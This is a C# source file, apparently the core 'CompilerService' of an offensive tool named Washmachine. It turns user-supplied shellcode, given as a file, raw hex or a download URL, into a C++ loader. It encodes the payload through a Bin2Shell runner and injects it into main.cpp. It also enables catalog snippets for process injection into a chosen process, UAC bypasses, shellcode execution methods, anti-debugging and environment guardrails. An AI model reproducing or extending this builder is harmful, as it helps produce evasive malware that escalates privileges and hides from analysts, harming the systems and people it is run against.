using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Washmachine.Logging;
using Washmachine.Models;

namespace Washmachine.Services;

public sealed class CompilerService : ICompilerService
{
    private readonly IAppPaths _paths;
    private readonly IBin2ShellRunner _bin2ShellRunner;
    private readonly ICppSectionEditor _cppEditor;
    private readonly ICodeSnippetCatalogService _snippets;
    private readonly IAppLogger _logger;

    public CompilerService(
        IAppPaths paths,
        IBin2ShellRunner bin2ShellRunner,
        ICppSectionEditor cppEditor,
        ICodeSnippetCatalogService snippets,
        IAppLogger logger)
    {
        _paths = paths ?? throw new ArgumentNullException(nameof(paths));
        _bin2ShellRunner = bin2ShellRunner ?? throw new ArgumentNullException(nameof(bin2ShellRunner));
        _cppEditor = cppEditor ?? throw new ArgumentNullException(nameof(cppEditor));
        _snippets = snippets ?? throw new ArgumentNullException(nameof(snippets));
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    public async Task<CompilerResult> CompileAsync(UiData data, CancellationToken cancellationToken = default)
    {
        if (data == null) throw new ArgumentNullException(nameof(data));

        ValidateEnvironment();

        var notes = new List<string>();

        try
        {
            RefreshMainCpp(notes);

            var source = DetermineShellcodeSource(data);
            await ApplyShellcodeAsync(data, source, notes, cancellationToken).ConfigureAwait(false);

            ApplyFeatureSelections(data, notes);

            notes.Add("Native project files updated. Run the C++ build separately to produce an executable.");
            return new CompilerResult(true, null, notes);
        }
        catch (OperationCanceledException)
        {
            _logger.Warn("Compilation cancelled by user.");
            notes.Add("Compilation cancelled.");
            return new CompilerResult(false, null, notes);
        }
        catch (Exception ex)
        {
            _logger.Error($"Compilation failed: {ex.Message}");
            notes.Add(ex.Message);
            return new CompilerResult(false, null, notes);
        }
    }

    private void ValidateEnvironment()
    {
        var errors = _paths.Validate();
        if (errors.Count == 0)
            return;

        foreach (var error in errors)
        {
            _logger.Error(error);
        }

        throw new InvalidOperationException("Required project assets are missing.");
    }

    private void RefreshMainCpp(ICollection<string> notes)
    {
        var templatePath = _paths.TemplateCppFile;
        var mainPath = _paths.MainCppFile;

        if (!File.Exists(templatePath))
            throw new FileNotFoundException("template.cpp not found.", templatePath);

        var backupDir = Path.Combine(_paths.MainCppDirectory, "maincpp_backups");
        Directory.CreateDirectory(backupDir);

        if (File.Exists(mainPath))
        {
            var backupName = $"main_{DateTime.Now:yyyyMMdd_HHmmss}.cpp";
            var backupPath = Path.Combine(backupDir, backupName);
            File.Copy(mainPath, backupPath, overwrite: true);
            notes.Add($"Existing main.cpp backed up to {backupPath}.");
            _logger.Info($"Previous main.cpp backed up to {backupPath}.");
        }

        File.Copy(templatePath, mainPath, overwrite: true);
        notes.Add("main.cpp refreshed from template.");
        _logger.Ok("main.cpp refreshed from template.");
    }

    private async Task ApplyShellcodeAsync(
        UiData data,
        ShellcodeSource source,
        ICollection<string> notes,
        CancellationToken cancellationToken)
    {
        switch (source.Kind)
        {
            case ShellcodeSourceKind.None:
                _logger.Warn("No shellcode source supplied; using template defaults.");
                notes.Add("No external shellcode supplied; template defaults remain.");
                break;

            case ShellcodeSourceKind.File:
                await EncodeShellcodeFromFileAsync(source.Value, data, notes, cancellationToken).ConfigureAwait(false);
                break;

            case ShellcodeSourceKind.Raw:
                string savedPath = SaveRawHexToBin(source.Value);
                notes.Add($"Raw shellcode saved to {savedPath}.");
                await EncodeShellcodeFromFileAsync(savedPath, data, notes, cancellationToken).ConfigureAwait(false);
                break;

            case ShellcodeSourceKind.Url:
                InjectUrlShellcode(source.Value, notes);
                break;
        }
    }

    private async Task EncodeShellcodeFromFileAsync(
        string filePath,
        UiData data,
        ICollection<string> notes,
        CancellationToken cancellationToken)
    {
        if (!File.Exists(filePath))
            throw new FileNotFoundException("Shellcode file not found.", filePath);

        var args = BuildBin2ShellArguments(data, filePath);
        _logger.Info($"Bin2Shell command: python main.py {string.Join(" ", args.Select(QuoteArg))}");

        string encoded = await _bin2ShellRunner
            .RunAsync(args, cancellationToken: cancellationToken)
            .ConfigureAwait(false);

        if (string.IsNullOrWhiteSpace(encoded))
            throw new InvalidOperationException("Bin2Shell returned empty output.");

        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "/*encodedshellcode*/", encoded, backup: false);
        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "unsigned int code_blob_len = 0;", string.Empty, backup: false);

        notes.Add("Encoded shellcode injected into main.cpp.");
        _logger.Ok("Encoded shellcode injected into main.cpp.");
    }

    private void InjectUrlShellcode(string url, ICollection<string> notes)
    {
        if (string.IsNullOrWhiteSpace(url))
            throw new ArgumentException("URL value is required.", nameof(url));

        _logger.Info($"Embedding shellcode download URL: {url}");
        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "//URLSHELL ", string.Empty, backup: false);
        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "$shellurl$", url, backup: false);
        notes.Add("Shellcode URL embedded into main.cpp.");
        _logger.Ok("Shellcode URL embedded.");
    }

    private void ApplyFeatureSelections(UiData data, ICollection<string> notes)
    {
        ApplyComboSelection(data, "genericShellcodeComboBox", "GENERIC SHELLCODE PAYLOADS FOR TESTINGS", notes);
        ApplyGuardrailSelection(data, notes);
        ApplyProcessInjectionSelection(data, notes);
        ApplyComboSelection(data, "shellcodeExecutionComboBox", "SHELLCODE EXECUTION", notes);
        ApplyComboSelection(data, "UACBComboBox", "UAC BYPASSES", notes);
        ApplyAntiDebugSelection(data, notes);
    }

    private void ApplyComboSelection(UiData data, string controlName, string catalogHeader, ICollection<string> notes)
    {
        if (!TryGetNonEmpty(data.ComboBoxes, controlName, out var selection))
            return;

        if (!TryResolveSnippet(catalogHeader, selection, out var section, out var item))
            return;

        _cppEditor.ReplaceSectionContent(_paths.MainCppFile, section.Template, item.Snippet);
        LogSnippetEnabled(section.Template, item.Id, notes);
    }

    private void ApplyGuardrailSelection(UiData data, ICollection<string> notes)
    {
        if (!TryGetNonEmpty(data.ComboBoxes, "guardrailComboBox", out var selection))
            return;

        if (!TryResolveSnippet("GUARDRAILS", selection, out var section, out var item))
            return;

        var parameter = data.TextBoxes.TryGetValue("guardrailParamTextBox", out var rawParam)
            ? rawParam.Trim()
            : string.Empty;

        string snippet = item.Snippet;
        bool requiresParameter =
            snippet.Contains("$guardrail_param$", StringComparison.Ordinal) ||
            snippet.Contains("__GUARDRAIL_PARAM__", StringComparison.Ordinal);

        if (requiresParameter && string.IsNullOrWhiteSpace(parameter))
            throw new InvalidOperationException("Guardrail parameter is required for the selected guardrail.");

        snippet = snippet.Replace("$guardrail_param$", parameter)
                         .Replace("__GUARDRAIL_PARAM__", parameter);
        _cppEditor.ReplaceSectionContent(_paths.MainCppFile, section.Template, snippet);
        LogSnippetEnabled(section.Template, item.Id, notes);
    }

    private void ApplyProcessInjectionSelection(UiData data, ICollection<string> notes)
    {
        if (!TryGetNonEmpty(data.ComboBoxes, "psInjComboBox", out var selection))
            return;

        if (!data.TextBoxes.TryGetValue("PsInjPsNameTextBox", out var psName) || string.IsNullOrWhiteSpace(psName))
            throw new InvalidOperationException("Process injection requires a target process name.");

        if (!TryResolveSnippet("PROCESS INJECTION", selection, out var section, out var item))
            return;

        var trimmedName = psName.Trim();
        string snippet = item.Snippet.Replace("$psname$", trimmedName);
        _cppEditor.ReplaceSectionContent(_paths.MainCppFile, section.Template, snippet);
        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "/*INJ ", string.Empty, backup: false);
        _cppEditor.ReplaceInCppFile(_paths.MainCppFile, "INJ*/", string.Empty, backup: false);

        LogSnippetEnabled(section.Template, item.Id, notes);
        var note = $"Process injection target set to {trimmedName}.";
        notes.Add(note);
        _logger.Ok(note);
    }

    private void ApplyAntiDebugSelection(UiData data, ICollection<string> notes)
    {
        if (!data.ListBoxes.TryGetValue("antiDebugListBox", out var selections) || selections.Count == 0)
            return;

        if (!_snippets.TryGetSectionByHeader("ANTI-DEBUGGING", out var section))
        {
            _logger.Warn("Snippet section 'ANTI-DEBUGGING' is missing in the catalog.");
            return;
        }

        var uniqueSelections = selections
            .Where(s => !string.IsNullOrWhiteSpace(s))
            .Distinct(StringComparer.OrdinalIgnoreCase)
            .ToList();

        if (uniqueSelections.Count == 0)
            return;

        var snippets = new List<string>();

        foreach (var selection in uniqueSelections)
        {
            if (!section.TryGetItem(selection, out var item))
            {
                _logger.Warn($"Anti-debugging method '{selection}' not found in snippet section.");
                continue;
            }

            snippets.Add(item.Snippet);
            LogSnippetEnabled(section.Template, item.Id, notes);
        }

        if (snippets.Count == 0)
            return;

        var combined = string.Join(Environment.NewLine, snippets);
        _cppEditor.ReplaceSectionContent(_paths.MainCppFile, section.Template, combined);
    }

    private bool TryResolveSnippet(string catalogHeader, string selection, out CodeSnippetSection section, out CodeSnippetItem item)
    {
        if (!_snippets.TryGetSectionByHeader(catalogHeader, out section))
        {
            _logger.Warn($"Snippet section '{catalogHeader}' not found in the catalog.");
            item = null!;
            return false;
        }

        if (!section.TryGetItem(selection, out item))
        {
            _logger.Warn($"Unable to find method '{selection}' in section '{catalogHeader}'.");
            return false;
        }

        return true;
    }

    private void LogSnippetEnabled(string sectionName, string itemId, ICollection<string> notes)
    {
        var message = $"Enabled {sectionName}:{itemId}.";
        notes.Add(message);
        _logger.Ok(message);
    }

    private IReadOnlyList<string> BuildBin2ShellArguments(UiData data, string shellcodeFile)
    {
        var args = new List<string> { "-y", _paths.Bin2ShellAlgos };

        if (TryParseIndex(data, "bin2hexEncoder", out int encoder))
        {
            args.Add("-e");
            args.Add(encoder.ToString(CultureInfo.InvariantCulture));
        }

        if (TryParseIndex(data, "bin2hexCompressor", out int compressor))
        {
            args.Add("-c");
            args.Add(compressor.ToString(CultureInfo.InvariantCulture));
        }

        if (TryParseIndex(data, "bin2hexEnvelope", out int envelope))
        {
            args.Add("-env");
            args.Add(envelope.ToString(CultureInfo.InvariantCulture));
        }

        args.Add(shellcodeFile);
        return args;
    }

    private static bool TryParseIndex(UiData data, string key, out int index)
    {
        index = 0;
        return data.ComboBoxes.TryGetValue(key, out var raw) && TryParseIndex(raw, out index) && index > 0;
    }

    private static bool TryParseIndex(string? raw, out int index)
    {
        index = 0;
        if (string.IsNullOrWhiteSpace(raw))
            return false;

        raw = raw.Trim();

        int idxEq = raw.IndexOf("Index", StringComparison.OrdinalIgnoreCase);
        if (idxEq >= 0)
        {
            int eqPos = raw.IndexOf('=', idxEq);
            if (eqPos > idxEq)
            {
                int i = eqPos + 1;
                while (i < raw.Length && char.IsWhiteSpace(raw[i])) i++;
                int j = i;
                while (j < raw.Length && char.IsDigit(raw[j])) j++;
                if (j > i && int.TryParse(raw.AsSpan(i, j - i), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
                    return true;
            }
        }

        int dash = raw.IndexOf('-');
        string head = (dash >= 0 ? raw[..dash] : raw).Trim();
        if (int.TryParse(head, NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
            return true;

        for (int k = 0; k < raw.Length; k++)
        {
            if (!char.IsDigit(raw[k])) continue;
            int start = k;
            int end = k;
            while (end < raw.Length && char.IsDigit(raw[end])) end++;
            if (int.TryParse(raw.AsSpan(start, end - start), NumberStyles.Integer, CultureInfo.InvariantCulture, out index))
                return true;
            k = end;
        }

        index = 0;
        return false;
    }

    private static bool TryGetNonEmpty(IDictionary<string, string> source, string key, out string value)
    {
        value = string.Empty;
        if (!source.TryGetValue(key, out var raw) || string.IsNullOrWhiteSpace(raw))
            return false;

        value = raw.Trim();
        return value.Length > 0;
    }

    private ShellcodeSource DetermineShellcodeSource(UiData data)
    {
        data.TextBoxes.TryGetValue("shellcodeFile", out var filePathRaw);
        data.TextBoxes.TryGetValue("shellcodeRAW", out var rawInput);
        data.TextBoxes.TryGetValue("shellcodeURL", out var urlInput);

        bool hasFile = !string.IsNullOrWhiteSpace(filePathRaw);
        bool hasRaw = !string.IsNullOrWhiteSpace(rawInput);
        bool hasUrl = !string.IsNullOrWhiteSpace(urlInput);

        int selected = new[] { hasFile, hasRaw, hasUrl }.Count(x => x);

        if (selected == 0)
            return new ShellcodeSource(ShellcodeSourceKind.None, string.Empty);
        if (selected > 1)
            throw new InvalidOperationException("Multiple shellcode sources detected. Provide only one.");

        if (hasFile) return new ShellcodeSource(ShellcodeSourceKind.File, filePathRaw!.Trim());
        if (hasRaw) return new ShellcodeSource(ShellcodeSourceKind.Raw, rawInput!.Trim());
        return new ShellcodeSource(ShellcodeSourceKind.Url, urlInput!.Trim());
    }

    private string SaveRawHexToBin(string raw)
    {
        if (string.IsNullOrWhiteSpace(raw))
            throw new ArgumentException("Raw hex input is required.", nameof(raw));

        byte[] bytes;
        var matches = Regex.Matches(raw, @"\\x([0-9A-Fa-f]{2})");
        if (matches.Count > 0)
        {
            bytes = new byte[matches.Count];
            for (int i = 0; i < matches.Count; i++)
            {
                bytes[i] = Convert.ToByte(matches[i].Groups[1].Value, 16);
            }
        }
        else
        {
            var hexOnly = new string(raw.Where(Uri.IsHexDigit).ToArray());
            if (hexOnly.Length == 0)
                throw new FormatException("Input does not appear to be hex-encoded.");
            if (hexOnly.Length % 2 != 0)
                throw new FormatException("Hex input must contain an even number of digits.");

            bytes = new byte[hexOnly.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hexOnly.Substring(i * 2, 2), 16);
            }
        }

        using var sha = SHA256.Create();
        var hash = sha.ComputeHash(bytes);
        var sb = new StringBuilder(hash.Length * 2);
        foreach (var b in hash)
            sb.Append(b.ToString("x2"));
        string hashHex = sb.ToString();

        string dir = _paths.EnsureTempShellcodeDirectory();
        string timestamp = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss", CultureInfo.InvariantCulture);
        string fileName = $"{hashHex}_{timestamp}.bin";
        string path = Path.Combine(dir, fileName);

        File.WriteAllBytes(path, bytes);
        _logger.Ok($"Raw shellcode persisted to {path}.");
        return path;
    }

    private static string QuoteArg(string value)
    {
        if (string.IsNullOrEmpty(value))
            return "\"\"";

        return value.IndexOfAny(new[] { ' ', '\t', '"' }) >= 0
            ? $"\"{value.Replace("\"", "\\\"")}\""
            : value;
    }

    private sealed record ShellcodeSource(ShellcodeSourceKind Kind, string Value);

    private enum ShellcodeSourceKind
    {
        None,
        File,
        Raw,
        Url
    }
}
